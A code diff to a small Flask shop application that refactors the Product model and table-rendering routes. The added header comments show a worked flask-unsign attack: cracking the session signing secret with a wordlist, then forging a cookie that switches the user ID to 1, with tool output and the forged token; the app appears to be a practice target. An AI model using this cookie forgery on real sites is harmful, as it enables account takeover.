@@ -2,6 +2,13 @@
 
 # flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
 # flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
+# example: flask-unsign --wordlist /tmp/wordlist.txt --unsign --cookie '.eJwlzjEOwyAMQNG7eO6AMcZ2LhOBMWpX0kxV795U2b70l_eBfa44nrC91xkP2F8DNoiwzmaVhV0JfRRxV09Jc1ERbPM_mVt14tLTIOY0S7AiofkknBThESFoI0jRe7OC0Qc3Ly1rZqwq5lRlzFwFr26sWZS7Jbgg5xHr1mT4_gCH3C6B.ZbafkA.ypRR8lv-t9NxnlTk-lDz0IHoK6M' --no-literal-eval
+# [*] Session decodes to: {'_fresh': True, '_id': 'ee9b5996575c831cd47cc8c008248771af996555a6c354b0d3550f4e581319cf31f3eeceee719de381cba941ebd5ac4a282516879c367df267179ca582785b90', '_user_id': '2'}
+# [*] Starting brute-forcer with 8 threads..
+# [+] Found secret key after 1 attempts
+# b'Hello World!'
+# example: flask-unsign --sign --cookie "{'_fresh': True, '_id': 'ee9b5996575c831cd47cc8c008248771af996555a6c354b0d3550f4e581319cf31f3eeceee719de381cba941ebd5ac4a282516879c367df267179ca582785b90', '_user_id': '1'}" --secret 'Hello World!'
+# .eJwlzjEOwyAMQNG7eO6AMcZ2LhOBMWpX0kxV795U2b70l_eBfa44nrC91xkP2F8DNoiwzmaVhV0JfRRxV09Jc1ERbPM_mVt14tLTIOY0S7AiofkknBThESFoI0jRe7OC0Qc3Ly1rZqwq5lRlzFwFr26sWZS7Jbgg5xHr1iB8f4fZLoA.ZbajkQ.v_65FKzXlncYwwZlFddBKB-n0ak
 
 from dataclasses import dataclass, asdict
 from flask import Flask, jsonify, request, Response, abort, redirect, url_for, render_template, session, flash, render_template_string
@@ -58,9 +65,14 @@ class User(UserMixin, BaseModel):
 
 
 class Product(db.Model):
+    id: int
+    name: str
+    description: str
+    price: float
+
     id = db.Column(db.Integer, primary_key=True)
-    name = db.Column(db.String(80), nullable=False)
-    description = db.Column(db.String(200))
+    name = db.Column(db.String(100), nullable=False)
+    description = db.Column(db.String(100))
     price = db.Column(db.Float, nullable=False)
 
 ######## Initialize ########
@@ -144,11 +156,12 @@ def products():
             "title": column.key,  # display as the table header's name
             "sortable": True,
         })
-    users = Product.query.order_by(Product.name).all()
-    print(json.dumps(users, default=lambda d: {
+    print(columns)
+    products = Product.query.order_by(Product.name).all()
+    data = json.loads(json.dumps(products, default=lambda d: {
         k["field"]: str(getattr(d, k["field"])) for k in columns}))
-    print(users)
-    return render_template("table.html", data=users, columns=columns)
+    print(data)
+    return render_template("table.html", data=data, columns=columns)
 
 
 @app.route("/users")
@@ -163,10 +176,9 @@ def users():
             "sortable": True,
         })
     users = User.query.order_by(User.username).all()
-    print(json.dumps(users, default=lambda d: {
+    data = json.loads(json.dumps(users, default=lambda d: {
         k["field"]: str(getattr(d, k["field"])) for k in columns}))
-    print(users)
-    return render_template("table.html", data=users, columns=columns)
+    return render_template("table.html", data=data, columns=columns)
 
 
 @app.route('/add-to-cart/<int:product_id>')
